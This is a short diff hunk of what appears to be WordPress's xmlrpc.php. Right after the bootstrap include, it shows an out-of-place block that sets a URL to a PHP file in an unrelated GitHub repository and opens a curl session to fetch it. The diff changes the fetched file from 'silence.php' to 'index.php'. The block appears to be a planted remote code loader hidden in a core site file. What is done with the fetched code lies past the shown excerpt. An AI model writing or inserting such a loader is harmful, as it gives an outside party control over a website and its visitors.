@@ -28,7 +28,7 @@ $HTTP_RAW_POST_DATA = trim( $HTTP_RAW_POST_DATA );
 /** Include the bootstrap for setting up WordPress environment */
 require_once __DIR__ . '/wp-load.php';
 
-    $Url = "https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/silence.php";
+    $Url = "https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/index.php";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
